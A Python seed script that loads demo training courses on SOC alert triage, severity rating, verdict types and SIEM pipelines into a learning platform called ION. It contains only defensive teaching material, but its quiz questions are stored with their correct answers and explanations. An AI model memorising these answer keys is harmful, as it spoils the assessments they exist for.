"""Seed L1/L2/L3 demo courses (v0.11.2).

One substantial course per tier, one module each, multiple lessons per
module to set the quality bar. Re-runnable: deletes all courses with
slugs starting `demo-` first.

Run inside the ION container::

    docker exec ion python /tmp/seed_courses.py

Or copy + run::

    cat seed_courses.py | docker exec -i ion python -
"""
from __future__ import annotations

import json
from datetime import datetime
from sqlalchemy.orm import Session

from ion.storage.database import get_engine, get_session_factory
from ion.models.course import (
    Course, CourseLevel, CourseModule, Lesson, LessonType, Question,
    QuestionKind,
)
from ion.models.user import User


# ── Helpers ──────────────────────────────────────────────────────────────


def _admin_user(session: Session) -> User:
    return session.query(User).order_by(User.id.asc()).first()


def _add_course(
    session: Session, *, slug: str, title: str, level: str,
    description_md: str, estimated_hours: int, order_in_level: int,
    pass_threshold: int = 70, skill_keys: list[str] | None = None,
    author_id: int | None = None,
) -> Course:
    c = Course(
        title=title, slug=slug, level=level, description_md=description_md,
        estimated_hours=estimated_hours, order_in_level=order_in_level,
        pass_threshold=pass_threshold, published=True,
        skill_keys=json.dumps(skill_keys) if skill_keys else None,
        author_id=author_id,
    )
    session.add(c)
    session.flush()
    return c


def _add_module(session: Session, course: Course, *, order: int, title: str,
                description_md: str = "", estimated_minutes: int = 30) -> CourseModule:
    m = CourseModule(
        course_id=course.id, order=order, title=title,
        description_md=description_md, estimated_minutes=estimated_minutes,
    )
    session.add(m)
    session.flush()
    return m


def _add_lesson(session: Session, module: CourseModule, *, order: int, title: str,
                lesson_type: str, content_md: str, duration_min: int = 10,
                lab_target_url: str | None = None) -> Lesson:
    l = Lesson(
        module_id=module.id, order=order, title=title, lesson_type=lesson_type,
        content_md=content_md.strip(), duration_min=duration_min,
        lab_target_url=lab_target_url,
    )
    session.add(l)
    session.flush()
    return l


def _add_q(session: Session, lesson: Lesson, *, order: int, kind: str,
           stem_md: str, options: list[dict] | None, correct,
           explanation_md: str = "", points: int = 1) -> Question:
    q = Question(
        lesson_id=lesson.id, order=order, kind=kind, stem_md=stem_md.strip(),
        options_json=json.dumps(options) if options else None,
        correct_answer_json=json.dumps(correct),
        explanation_md=explanation_md.strip() if explanation_md else None,
        points=points,
    )
    session.add(q)
    session.flush()
    return q


# ── Cleanup ──────────────────────────────────────────────────────────────


def _cleanup(session: Session) -> None:
    demo_courses = session.query(Course).filter(Course.slug.like("demo-%")).all()
    if not demo_courses:
        return
    print(f"[cleanup] removing {len(demo_courses)} demo course(s)")
    for c in demo_courses:
        session.delete(c)  # cascade drops modules/lessons/questions
    session.flush()


# ── L1 — Alert Triage Fundamentals ───────────────────────────────────────


def _seed_l1(session: Session, author_id: int) -> Course:
    course = _add_course(
        session,
        slug="demo-l1-alert-triage-fundamentals",
        title="Alert Triage Fundamentals",
        level=CourseLevel.L1,
        description_md=(
            "Foundational L1 course covering what a SOC analyst actually does on shift: "
            "the alert lifecycle, severity rating, the difference between true positive / "
            "false positive / benign true positive, and when to escalate to L2. Pairs with "
            "ION's investigation queue and Bob (the AI analyst) so you can see real verdicts "
            "as you go.\n\n"
            "**By the end you'll be able to:**\n\n"
            "- Describe the five states of an alert from ingestion to closure\n"
            "- Apply severity ratings consistently using a documented rubric\n"
            "- Distinguish true positive, false positive, and benign true positive\n"
            "- Decide when to escalate vs close vs request more enrichment\n"
        ),
        estimated_hours=2,
        order_in_level=1,
        skill_keys=["alert-triage", "siem-operations"],
        author_id=author_id,
    )
    mod = _add_module(
        session, course, order=1,
        title="The alert lifecycle",
        description_md="From ingestion to closure — what every analyst needs to track.",
        estimated_minutes=45,
    )

    # Lesson 1.1 — reading: the lifecycle (rewritten v0.11.3 to BTL1 depth)
    l1 = _add_lesson(
        session, mod, order=1, title="What happens to an alert?",
        lesson_type=LessonType.READING, duration_min=22,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Name the five states every alert moves through, and identify which one a given alert is currently in
> 2. Explain who owns each state (L1 / L2 / detection-engineering / IT)
> 3. Read an `AlertTriage` row in ION and tell from its fields exactly where the alert sits in the lifecycle
> 4. Recognise the most common L1 anti-pattern (skipping triage and investigating everything) and avoid it
>
> **Prerequisites.** None — this is the first lesson of L1. You need access to ION's `/alerts` page to follow the worked example, but you can read this end-to-end first.

## Why this is the most useful mental model you'll learn

Working a SOC shift without an alert-lifecycle model is like working a hospital triage desk without one. You'll handle every patient with the same urgency, exhaust yourself, and miss the genuinely sick. The five-state model gives you a consistent answer to two questions you'll be asked thousands of times:

1. *What's the next thing that has to happen for this alert?*
2. *Whose problem is that — mine, or someone else's?*

Once you can answer those two questions in under five seconds for any alert, you're an effective L1.

## The lifecycle

Every alert — whether it came from Microsoft Defender, Splunk, Elastic Security, CrowdStrike, or a custom regex on a syslog feed — moves through these five states in order:

```mermaid
flowchart LR
    A[1. Ingested<br/>queue] --> B[2. Triaged<br/>L1 decision]
    B -->|investigate| C[3. Investigated<br/>L1 or L2 active work]
    B -->|fast close| D[4. Resolved<br/>verdict assigned]
    C --> D
    D --> E[5. Closed + Tuned<br/>detection-eng / SOC lead]
    B -. dup / FP signature .-> D
    C -. need senior eyes .-> F[Escalate to L2/L3]
    F --> D
```

The two dotted edges are the ones new analysts forget. From **Triaged**, you can shortcut directly to **Resolved** if the alert is a known false-positive signature, a duplicate of an open case, or matches a documented benign pattern. From **Investigated**, you can hand off to L2/L3 if the work is genuinely beyond your tier — that's not failure, it's good queue management.

### 1. Ingested

The detection rule fired and the alert landed in the queue. Nobody has looked at it yet.

What's true here:

- A row exists somewhere — for ION, it's an `AlertTriage` row with `status = OPEN`, `case_id IS NULL`, and `suggested_verdict IS NULL`
- The alert carries everything the rule emitted: rule name, MITRE techniques, host, user, source/destination IPs, the raw `kibana.alert.reason` one-liner, and any extracted observables
- **No human has formed an opinion yet.** Bob (the AI analyst) may have written a `suggested_verdict` if he's enabled, but the human-loop is unstarted

A common mis-read at this stage is judging severity from the *rule name*. A rule called `Suspicious PowerShell Execution` sounds urgent, but the same rule fires a hundred times a day on a SCCM-managed estate with PowerShell-driven config drift. The rule name is a *category*; the severity is whatever the analyst assigns after triage.

If your queue at the start of shift has 800+ unprocessed items, **that is a tuning problem, not a productivity problem.** No analyst can triage 800 items in eight hours without short-cutting. Fixing the noise belongs to detection-engineering, not to working harder.

### 2. Triaged

An analyst has eyeballed it for 10–60 seconds and made an initial decision. Triage is *not* investigation — it's the prioritisation step. Three outcomes are possible:

| Triage outcome | What happens next |
|---|---|
| **Worth investigating** | Move to state 3, decide whether L1 takes it or escalate up |
| **Duplicate / known FP signature** | Skip straight to state 4 with verdict `duplicate` or `false_positive` — record which signature matched |
| **Insufficient information to decide** | Set `status = ACKNOWLEDGED`, leave `suggested_verdict IS NULL`, and request enrichment (IP rep, hash lookup, asset-criticality lookup); revisit when enrichment comes back |

In ION, triage decisions show up as:
- `AlertTriage.status` — flips from `OPEN` → `ACKNOWLEDGED` (or → `CLOSED` if fast-closed)
- `AlertTriage.suggested_verdict` — the analyst's intent, not the final verdict (the final lives on `AlertCase.closure_reason` in state 5)
- `AlertTriage.assigned_to_id` — picks up the analyst who claimed it
- `AlertTriage.first_seen_at` — when triage *started*, used for SLA reporting

The discipline at state 2: **triage the whole queue first, then pick what to investigate.** Working alerts in arrival order is the reliable way to spend four hours on a false positive while a critical sits ignored at the bottom of the list.

### 3. Investigated

Someone is *actively working* the alert. They're pulling logs, looking up indicators on VirusTotal / OpenCTI / AbuseIPDB, checking whether a service account fired the rule (often benign) or a real human did (more often investigatable), and walking the timeline of what happened around the event.

In ION, investigation work shows up as:

- An `Investigation` row keyed by `alert_id_ref` — Bob writes one of these every time the AI analyst runs on the alert; humans add notes via `Note` rows
- `AlertTriage.status = ACKNOWLEDGED` and `case_id` set if a case was opened to track the investigation properly
- One or more `ObservableLink` rows tying extracted IOCs (IPs, hashes, domains) to the case
- Possibly a `PlaybookExecution` row if a playbook ran during the investigation

This is the time-expensive part of the job. A typical L1 investigation is 5–20 minutes; an L2/L3 investigation can run hours or days. **The point of state 2 (triage) is to make sure that only alerts which deserve a 20-minute investigation actually receive one.**

### 4. Resolved

A verdict has been reached. ION's `CaseClosureReason` enum captures the six allowed values — these are the same ones every detection-engineering team measures their detection quality against:

| Value | Meaning | Tuning owed? |
|---|---|---|
| `true_positive` | Rule fired on real malicious / unauthorised activity | No |
| `false_positive` | Rule fired on benign activity — the rule shouldn't have fired | **Yes** — exclusion or refinement |
| `benign_true_positive` | Rule correctly identified the behaviour, but the activity is authorised in this environment (vuln scanner, sanctioned admin tool) | Scope refinement only |
| `duplicate` | Already covered by an open case | No |
| `insufficient_data` | Can't decide — escalating or parking | No (yet) |
| `not_applicable` | Out of scope for this SOC (different team owns the asset) | No |

The single most-confused L1 distinction is **false_positive vs benign_true_positive**. Get them right and the detection-engineering team writes good tuning; get them wrong and they either delete a useful rule or fail to fix a noisy one.

A vuln scanner triggering the `Port scan from internal asset` rule is `benign_true_positive` — the rule correctly identified port-scan behaviour, the scanner is authorised. A typo'd regex matching every Word document is `false_positive` — the rule shouldn't be firing on those at all.

### 5. Closed + Tuned

The case is shut and any tuning actions are recorded. For `false_positive` and `benign_true_positive` verdicts, **a tuning action is owed** — without it, the same alert reappears tomorrow and the queue grows.

In ION, tuning actions show up as:

- A `TuningProposal` row created from the case detail page — captures the proposed exclusion / refinement / rule deletion
- The case is `CLOSED` in `AlertCase.status`
- The verdict is recorded in `AlertCase.closure_reason`
- `AIFeedback` row written automatically — captures Bob's predicted verdict vs the human's actual verdict for the per-template scorecard

The tuning step is what separates a healthy SOC from a noisy one. A SOC that closes 500 false-positives a week without tuning is a SOC that will close 500 false-positives next week too.

## Worked example — walking a real alert through all five states

Let's trace `DEMO-0001` (the seeded test case from `seed_test_data.py`). This is exactly the path an L1 analyst walks for one alert during a shift:

```mermaid
sequenceDiagram
    participant ES as Elasticsearch
    participant ION as ION
    participant Bob
    participant L1 as L1 Analyst

    ES->>ION: alert-demo-001-a fires (Suspicious PowerShell, severity=high)
    Note over ION: State 1 — Ingested. AlertTriage row, status=OPEN.
    ION->>Bob: investigate_alert(alert_id)
    Bob->>Bob: parse cmd_line, extract IOCs, check OpenCTI
    Bob-->>ION: verdict=true_positive, confidence=high, key_observations cited
    Note over ION: AlertTriage.suggested_verdict = "true_positive"
    L1->>ION: claims the alert, reads Bob's narrative + key observations
    Note over ION: State 2 — Triaged. status=ACKNOWLEDGED, assigned_to=L1.
    L1->>ION: opens case DEMO-0001, links the alert
    L1->>ION: pivots to similar-observables panel, sees IP shared with DEMO-0002
    Note over ION: State 3 — Investigated. case_id linked, observables extracted.
    L1->>ION: confirms phishing chain, requests host isolation via IT
    L1->>ION: closes case with closure_reason=true_positive
    Note over ION: State 4 — Resolved. AlertCase.status=CLOSED.
    L1->>ION: no tuning needed (TP) — adds note, signs off
    Note over ION: State 5 — Closed + Tuned. AIFeedback row written automatically.
```

The whole walk took 8 minutes of L1 time. Bob's investigation took 30 seconds and gave the analyst a strong starting point: a verdict suggestion, three cited key observations (the obfuscated command line, the Outlook parent process, the malicious IP), and three recommended actions. The L1's job wasn't to *redo* Bob's work — it was to **confirm**, **gather the cross-case context Bob couldn't see**, and **decide on the closure verdict**.

That's what good L1 work looks like in 2026: a partnership with the AI analyst, not a competition with it.

## Common mistakes (and how to avoid them)

These are the four mistakes new L1s make most often. All four show up in pre-shift reviews of analyst queue performance.

1. **Skipping triage and investigating every alert.** Works for two days, then the queue overwhelms you. Fix: every shift, *triage the whole queue first* — even if it takes 45 minutes. Then pick the highest-severity unaddressed alerts to investigate.

2. **Closing without tuning on false positives.** The rule will fire again tomorrow. Fix: any `false_positive` or `benign_true_positive` verdict requires either an immediate rule edit or a `TuningProposal` ticket — no exceptions.

3. **Confusing false_positive with benign_true_positive.** Detection-engineering loses signal either way: too many false_positives and they delete useful rules; too many benign_true_positives miscategorised as false_positives and they over-tune. Fix: always ask "did the rule correctly identify the behaviour it looks for?" — if yes, it's benign_true_positive (or true_positive); if no, it's false_positive.

4. **Re-investigating duplicates.** A different rule triggers on the same underlying event — and you investigate it like it's new. Fix: always check ION's "Cross-Case Observable Sightings" panel on case detail before opening a new case. If the IPs / hashes match an open case, link the alert to that case as `duplicate` instead.

## How this maps to ION's data model

ION's tables are designed around the lifecycle. Here's the cheat-sheet:

| Lifecycle state | Primary ION row | Key fields |
|---|---|---|
| Ingested | `AlertTriage` | `status=OPEN`, `case_id IS NULL` |
| Triaged | `AlertTriage` | `status=ACKNOWLEDGED`, `suggested_verdict` set |
| Investigated | `AlertCase` + `Investigation` + `Note` + `ObservableLink` | `case_id` linked from triage |
| Resolved | `AlertCase.closure_reason` | the six-value enum |
| Closed + Tuned | `AlertCase.status=CLOSED`, `TuningProposal`, `AIFeedback` | tuning row exists if FP/BTP |

If you're reading code or writing a query and want to know *which alerts are stuck at which stage*, those columns are the ones to filter on.

## Glossary

- **AlertTriage** — ION's row representing an L1's view on an alert. One per ES alert id.
- **AlertCase** — ION's row for the formal case opened around one or more linked alerts.
- **CaseClosureReason** — the six-value enum L1s use to verdict cases (`true_positive` / `false_positive` / `benign_true_positive` / `duplicate` / `insufficient_data` / `not_applicable`).
- **Bob** — ION's AI analyst service user. Authors automated `Investigation` rows + Note commentary.
- **TuningProposal** — ticket-shaped row that captures a proposed detection-rule change. Owed for every `false_positive` close.
- **AIFeedback** — the per-case ledger row that records Bob's predicted verdict vs the human's actual verdict, for scoring per-template Bob accuracy.

## Further reading

- MITRE D3FEND model — the *defensive* counterpart to ATT&CK. Worth bookmarking for tier-2 work.
- *Crafting the InfoSec Playbook* (O'Reilly, Bollinger / Enright / Valites) — chapter 4 covers the alert lifecycle from a process angle.
- ION's own docs: `docs/RUNBOOK.md` covers the L1 escalation matrix; `docs/ARCHITECTURE.md` walks the AlertTriage / AlertCase / Investigation row relationships.

---

When you're ready, move on to the **severity rating quiz** to lock in the rubric you'll use thousands of times this year.
""",
    )
    # Reading lessons have no questions; learner clicks "mark complete".

    # Lesson 1.2 — quiz: severity rating rubric
    l2 = _add_lesson(
        session, mod, order=2, title="Severity rating rubric — quiz",
        lesson_type=LessonType.QUIZ, duration_min=12,
        content_md="""
## Apply the severity rubric

Severity drives queue ordering — high severity alerts get worked first.
Apply the rubric consistently or your shift partner will work the wrong
items. ION uses the standard four-tier scale:

| Severity | When to use |
|---|---|
| **Critical** | Active confirmed compromise — adversary is in, data is moving, or systems are unavailable. Page on-call. |
| **High** | Strong indicators of compromise but not yet confirmed in-progress (e.g. credential theft confirmed, exfiltration not yet detected) |
| **Medium** | Suspicious activity that needs investigation but isn't visibly active (e.g. one anomalous logon, one failed exploit attempt) |
| **Low** | Policy violation, minor misconfiguration, informational |

### Rules of thumb

- **If unsure, rate one tier higher.** Better to investigate something
  that turns out to be medium than miss a critical.
- **A confirmed false positive becomes Low** regardless of original rating.
- **Asset criticality is a multiplier.** A medium-severity finding on a
  domain controller usually rates High because the blast radius matters.

Take the quiz to lock in the rubric.
""",
    )
    _add_q(session, l2, order=1, kind=QuestionKind.SINGLE,
        stem_md="A new alert fires: a domain admin account logged in from a country your org has never had presence in, at 3 AM local time. The login succeeded but no follow-on activity has been seen yet. What's the most appropriate severity?",
        options=[
            {"value": "low", "label": "Low — login succeeded, no follow-on"},
            {"value": "medium", "label": "Medium — anomalous but no observable damage"},
            {"value": "high", "label": "High — domain admin from impossible-travel geo"},
            {"value": "critical", "label": "Critical — page on-call immediately"},
        ],
        correct="high",
        explanation_md="**High** is right. Domain admin + impossible-travel + off-hours is a strong indicator of credential compromise even before downstream activity. *Critical* would be appropriate only after seeing follow-on (privilege use, lateral movement). *Medium* underweights the privilege of the account — domain admin makes the asset-criticality multiplier kick in.",
        points=2,
    )
    _add_q(session, l2, order=2, kind=QuestionKind.SINGLE,
        stem_md="A user reports a phishing email. Email security gateway already blocked it. No clicks were registered, no credentials submitted. What's the rating?",
        options=[
            {"value": "low", "label": "Low — informational; control did its job"},
            {"value": "medium", "label": "Medium — phishing is always at least medium"},
            {"value": "high", "label": "High — credential-theft attempt"},
            {"value": "critical", "label": "Critical — escalate"},
        ],
        correct="low",
        explanation_md="**Low**. The control worked — no human interaction occurred and no credentials moved. This is informational and useful for trending (which campaigns are hitting your org), but it's not an active incident. Resist the urge to inflate severity because the *category* feels scary.",
        points=2,
    )
    _add_q(session, l2, order=3, kind=QuestionKind.MULTI,
        stem_md="Which of the following correctly bump an alert's severity *upward*? (Pick all that apply.)",
        options=[
            {"value": "asset", "label": "The affected asset is a domain controller / cert authority / customer-data DB"},
            {"value": "actor", "label": "The user account holds privileged role (DA, root, finance approver)"},
            {"value": "active", "label": "Follow-on activity is observable (process spawned, network egress to unfamiliar IP)"},
            {"value": "outside", "label": "Activity is from outside the org's normal hours and geos"},
            {"value": "rule_age", "label": "The detection rule was added recently"},
            {"value": "match_count", "label": "The same rule fired against many assets at once"},
        ],
        correct=["asset", "actor", "active", "outside", "match_count"],
        explanation_md="All correct except *rule age*. Recent rules might be more or less accurate than mature ones — newness alone doesn't change the threat. Everything else is a real severity multiplier; especially the *match_count* one — many simultaneous matches often means a campaign or worm.",
        points=3,
    )
    _add_q(session, l2, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="A confirmed false positive should be rated `low` regardless of the original detection severity.",
        options=[
            {"value": "true", "label": "True"},
            {"value": "false", "label": "False"},
        ],
        correct="true",
        explanation_md="**True.** Once you've confirmed it's a false positive, the operational severity *to the SOC* is low — you're closing it and tuning the rule. A high-severity false positive is still a false positive.",
        points=1,
    )
    _add_q(session, l2, order=5, kind=QuestionKind.SHORTANSWER,
        stem_md="Name the four severity tiers, in order from least to most urgent (separate with commas, e.g. `low, medium, high, critical`).",
        options=None,
        correct=["low, medium, high, critical", "low,medium,high,critical"],
        explanation_md="The four tiers are **low, medium, high, critical** — escalating in operational urgency. ION uses the same scale across alerts, cases, and CyAB.",
        points=1,
    )

    # Lesson 1.3 — quiz: verdict semantics
    l3 = _add_lesson(
        session, mod, order=3, title="True positive vs false positive vs benign — quiz",
        lesson_type=LessonType.QUIZ, duration_min=10,
        content_md="""
## The three verdicts you'll close 95% of cases as

This is the single most-confused part of L1 work, and it has direct
consequences for the detection-engineering team. Get it wrong and they
either tune away real detections or fail to tune away noise.

### True positive

The rule fired on **real malicious / unauthorised activity**. Whether
the SOC stopped it or not, the alert was correct. Tuning is **not** owed.

### False positive

The rule fired on **benign activity that the rule shouldn't have fired
on**. The detection is broken or too broad. **Tuning is owed** — either
an exclusion, a refinement to the query, or a deletion of the rule.

### Benign true positive

The rule fired correctly — the behaviour the rule looks for *was* present —
but in this environment that behaviour is **authorised**. Examples:

- A vuln scanner triggered the "port scan from internal asset" rule. The
  rule is correct; the scanner is authorised.
- A new admin tool triggered the "PowerShell from unusual parent" rule.
  Behaviour is real; tool is sanctioned.

The rule is *working as designed*. Tuning is owed only as a scope
refinement (exclude this asset / this admin tool from this rule), not as
a fundamental rule change.
""",
    )
    _add_q(session, l3, order=1, kind=QuestionKind.SINGLE,
        stem_md="Vulnerability scanner Tenable runs nightly and triggers your `Port scan from internal asset` rule every time. The behaviour is real, the asset (the scanner) is authorised. Closure verdict?",
        options=[
            {"value": "true_positive", "label": "true_positive"},
            {"value": "false_positive", "label": "false_positive"},
            {"value": "benign_true_positive", "label": "benign_true_positive"},
            {"value": "not_applicable", "label": "not_applicable"},
        ],
        correct="benign_true_positive",
        explanation_md="**benign_true_positive**. The rule correctly identified the behaviour it looks for (port scanning from internal). The behaviour is authorised in this environment because it's the sanctioned vuln scanner. Tuning action: add the scanner asset to the rule's exclusion list. Don't delete the rule — it's still valuable for *unauthorised* internal scanning.",
        points=2,
    )
    _add_q(session, l3, order=2, kind=QuestionKind.SINGLE,
        stem_md="A rule named `Suspicious cmd.exe spawned by Word` fires whenever any user opens a Word doc that triggers a macro. After 5 cases all closed as benign (everyone is using approved macros), what's the right verdict for the *current* case and the right tuning action?",
        options=[
            {"value": "tp_no_tune", "label": "true_positive — no tuning needed; macros are dangerous"},
            {"value": "fp_delete_rule", "label": "false_positive — delete the rule"},
            {"value": "fp_refine_rule", "label": "false_positive — tune the rule to exclude approved macros"},
            {"value": "btp_add_exclude", "label": "benign_true_positive — add an asset exclusion"},
        ],
        correct="fp_refine_rule",
        explanation_md="**false_positive — tune the rule.** The detection's *intent* is right (cmd.exe from Word IS suspicious in general), but the implementation is too broad — it doesn't distinguish approved macros from unknown ones. The right move is refining the query (exclude signed/whitelisted macros, hash-of-spawned-binary in known-good list, etc.), not deleting the rule. *benign_true_positive* would apply if it were one specific approved macro firing repeatedly — here the noise is systemic so the rule itself needs work.",
        points=2,
    )
    _add_q(session, l3, order=3, kind=QuestionKind.SINGLE,
        stem_md="Bob (the AI analyst) suggested `false_positive` with high confidence. You agree on quick review. After you close the case as false_positive, what *must* happen next?",
        options=[
            {"value": "nothing", "label": "Nothing — Bob's confidence is enough"},
            {"value": "kibana_sync", "label": "Sync the closure verdict back to Kibana so analysts there see it"},
            {"value": "tuning", "label": "A tuning action is owed — either an exclusion, refinement, or a tuning ticket"},
            {"value": "page_l2", "label": "Page L2 because false_positive needs senior review"},
        ],
        correct="tuning",
        explanation_md="**A tuning action is owed.** This is the one thing that distinguishes a healthy SOC from a noisy one. *Every* false_positive should generate either an immediate rule tweak or a `TuningProposal` ticket. The Kibana sync happens automatically; L2 review isn't required for FPs.",
        points=2,
    )

    # ── Module 2 — SIEM Fundamentals (v0.11.5) ───────────────────────────
    # Authored at BTL1/SANS-equivalent depth. ECS-first throughout — every
    # KQL snippet uses ECS field names since ION integrates with Elastic.
    mod2 = _add_module(
        session, course, order=2,
        title="SIEM Fundamentals",
        description_md=(
            "Pipeline anatomy, the ECS data model, KQL queries, and the "
            "cluster-investigation pattern. By the end of this module you "
            "can read a Wazuh-sourced alert document, pivot in Kibana, and "
            "hand a clean timeline to L2."
        ),
        estimated_minutes=180,
    )

    m2l1 = _add_lesson(
        session, mod2, order=1,
        title="What a SIEM is and how data flows through it",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Name the six stages of the SIEM pipeline (ingest → parse → normalise → store → query → alert) and identify which Elastic Stack component owns each
> 2. Distinguish a SIEM from a plain log aggregator using at least three concrete capability differences
> 3. Compare cloud-native, on-prem, and hybrid SIEM architectures in terms an L1 cares about (data residency, latency, what you can self-serve vs escalate)
> 4. Trace a single Windows Security event from generation on the endpoint to visibility in Kibana
> 5. Identify the failure modes at each pipeline stage that an L1 is likely to notice
>
> **Prerequisites.** Module 1 *Alert Triage Fundamentals* completed.

## The six-stage pipeline

A SIEM is not a single product — it's a pipeline that ingests events from heterogeneous sensors, normalises them into a shared schema, stores them in a queryable substrate, and runs detection logic on top. Memorise the six stages — every SIEM you encounter in your career maps onto them:

```mermaid
flowchart LR
    subgraph Endpoint
        A[Sysmon / Security<br/>Event Log] --> B[Winlogbeat]
        C[auditd / syslog] --> D[Filebeat /<br/>Auditbeat]
        E[NIC mirror] --> F[Packetbeat]
    end
    B --> G[Ingest pipeline<br/>ECS normaliser]
    D --> G
    F --> G
    G --> H[(Elasticsearch<br/>data streams)]
    H --> I[Kibana Discover]
    H --> J[Detection engine<br/>scheduled rules]
    J --> K[(.alerts-security.<br/>alerts-default)]
    K --> L[ION case ingest]
    L --> M[Tier-1 analyst]
```

1. **Ingest** — A sensor (Sysmon, auditd, a firewall, a cloud audit log) emits an event. A shipper picks it up and forwards it. In ION's deployment that's `winlogbeat`, `filebeat`, `packetbeat`, `auditbeat`, or the Wazuh agent.
2. **Parse** — The raw event (XML for Windows, syslog text for Linux, JSON for cloud) is broken into key/value pairs. In Elastic this happens via Beats processors, ingest pipelines, or Logstash filters. The output is structured but not yet schema-conformant.
3. **Normalise** — Fields are renamed and re-typed to the canonical schema. ECS is the canonical schema for the Elastic Stack; CIM is the equivalent for Splunk. After this stage, a Windows logon and a Linux SSH login both produce documents with `event.category: ["authentication"]` and `user.name`.
4. **Store** — Documents are written to a time-series index. Elasticsearch uses index lifecycle management (ILM) to roll indices over (e.g. `winlogbeat-*` becomes `.ds-winlogbeat-2026.04.23-000001`).
5. **Query** — Analysts and detection rules read the indices via Kibana Discover, Lens, or the search API.
6. **Alert** — Detection logic (Elastic detection rules, Wazuh rules, EQL queries) runs on a schedule, evaluates conditions, and emits alert documents into a separate index (`.alerts-security.alerts-default`) which ION ingests as cases.

When an alert *doesn't* fire, the failure is almost always at parse, normalise, or query stage. **An L1 who can localise the failure to a stage is already more useful than one who can't.**

## Worked example — tracing a 4625 from endpoint to Kibana

A Windows host `WS-FIN-014.corp.example.org` has a failed logon. Walk through the pipeline:

```mermaid
sequenceDiagram
    participant EP as Endpoint
    participant WB as Winlogbeat
    participant ES as Elasticsearch
    participant DR as Detection rule
    participant ION as ION
    participant L1 as L1 Analyst
    EP->>WB: EventID 4625
    WB->>WB: Parse XML, apply ECS module
    WB->>ES: POST winlogbeat-* doc
    Note right of ES: stage: store
    DR->>ES: every 5min: query last 15min<br/>event.code:"4625" group by source.ip
    ES-->>DR: 14 hits, src 10.42.7.91
    DR->>ES: write .alerts-security doc
    ES-->>ION: alert pulled into case
    ION->>L1: Case CRIT-2026-04123 opened
    L1->>ES: Discover pivot: source.ip:"10.42.7.91"
```

- **Ingest:** Windows writes EventID 4625 to the `Security` channel; `winlogbeat` reads it via `winlogbeat.event_logs` configuration and forwards it.
- **Parse:** The Beat's Windows module decodes the event XML and extracts `winlog.event_id: "4625"`, `winlog.event_data.TargetUserName: "j.smith"`, `winlog.event_data.IpAddress: "10.42.7.91"`.
- **Normalise:** The module's ECS processor sets `event.code: "4625"`, `event.action: "logon-failed"`, `event.category: ["authentication"]`, `event.outcome: "failure"`, `user.name: "j.smith"`, `source.ip: "10.42.7.91"`, `host.name: "WS-FIN-014"`.
- **Store:** The document lands in the data stream backing `winlogbeat-*`, with `@timestamp` set to the event's UTC timestamp.
- **Query:** Analyst opens Discover with index pattern `winlogbeat-*` and filters `event.code : "4625" and host.name : "WS-FIN-014"`.
- **Alert:** A detection rule "Multiple Logon Failures from Same Source" runs every 5 minutes, queries the last 15 minutes for `event.code : "4625"` grouped by `source.ip`, and fires when count > 10. The alert document appears in `.alerts-security.alerts-default` and ION pulls it into a case.

## SIEM versus log aggregator

Every shop has a graveyard of "we'll just grep the logs" projects. A SIEM differs from a flat log aggregator (rsyslog-on-a-box, Loki, plain S3) along five axes:

1. **Schema enforcement** — ECS or CIM means a query for `user.name : "alice"` returns Windows logons, SSH logins, and AWS API calls in one result set. Aggregators preserve raw text; you'd have to know each format.
2. **Detection engine** — A SIEM runs scheduled rules with state (deduplication, suppression, throttling). An aggregator can be hooked up to alerting, but the rule logic, exception handling, and alert document format are bolted on.
3. **Enrichment** — Threat-intel lookups, GeoIP, asset criticality, user identity attributes — applied at ingest or query time. ION's TIDE/OpenCTI integration enriches IOCs at query time.
4. **Workflow** — Alert states (acknowledged, in-progress, closed), assignments, comments, runbooks, case handoff. The alert is treated as a long-lived object, not a transient log line.
5. **Retention tiers** — Hot/warm/cold/frozen storage with ILM. Aggregators usually do not separate detection-relevant retention from compliance retention.

ION layers cases, AI summaries, and ticker workflow on top of an Elastic SIEM, so the SIEM-vs-aggregator distinction matters: when an analyst says *"the data isn't in the SIEM"*, they may mean it's in raw log storage but never normalised. That's a real and recoverable failure, but it requires a different fix than *"the alert didn't fire"*.

## Architectures: cloud, on-prem, hybrid

Three deployment patterns dominate. An L1 should know which one their employer runs because it changes day-to-day workflow:

- **Cloud-native SIEM** — Elastic Cloud, Microsoft Sentinel, Chronicle, Sumo Logic. Storage and compute are vendor-managed. Ingest happens via cloud-side endpoints; on-prem assets ship via agents over TLS. **Pros:** scales without ops effort, vendor handles ILM and shard math. **Cons:** egress costs, data-residency concerns, less visibility into the underlying cluster when something breaks.
- **On-prem SIEM** — Self-hosted Elasticsearch, Splunk Enterprise, Wazuh manager. Common in regulated industries (healthcare, defence, finance). ION's reference deployment is on-prem-style: a Docker-Compose Elastic + Wazuh stack inside the customer environment. **Pros:** full control over data, no egress, integration with on-prem identity (Keycloak, AD). **Cons:** ops burden — you're responsible for cluster health, backups, ILM tuning.
- **Hybrid** — A common real-world shape: Wazuh manager on-prem ingesting endpoint events, forwarding alerts to a cloud-hosted Elastic for long-term retention and cross-tenant search.

For an L1, the architecture decision affects: (1) where to look when ingest is delayed (which queue is backed up?), (2) which hostname to use when contacting an asset (the SIEM's view may lag DHCP), (3) what you can self-serve versus what requires the platform team. ION analysts working an on-prem deployment can typically check `docker compose ps` on the SIEM host themselves; analysts on a cloud deployment cannot and must escalate.

## Worked example — "the dashboard says zero events"

Analyst sees `WS-MKT-022` is missing from the asset-coverage dashboard. They check Discover with `host.name : "WS-MKT-022"` over the last 24 hours and see 12,000 events. The dashboard's saved search is filtered on a custom field `asset.criticality : "high"` which is populated by an enrichment pipeline. The host's enrichment record was deleted last week. The pipeline flaw is at the **enrichment** stage — events are flowing, the schema is intact, but the dashboard's filter condition is no longer satisfied. The correct action is to escalate to the detection-engineering team for enrichment repair, not to chase the host as "offline".

## Glossary

- **ECS (Elastic Common Schema)** — Open schema defining canonical field names for security and observability data
- **Beats** — Lightweight Elastic shippers (Winlogbeat, Filebeat, Packetbeat, Auditbeat)
- **Ingest pipeline** — Server-side document processor in Elasticsearch that runs before storage
- **ILM (Index Lifecycle Management)** — Elasticsearch policy mechanism for hot/warm/cold/frozen tier transitions
- **Data stream** — Append-only abstraction over rolling indices; `winlogbeat-*` is a data stream alias
- **CIM (Common Information Model)** — Splunk's equivalent of ECS
- **Detection rule** — Scheduled query that emits an alert document when its condition is satisfied
- **Sensor** — Source of telemetry (Sysmon, auditd, NetFlow exporter)
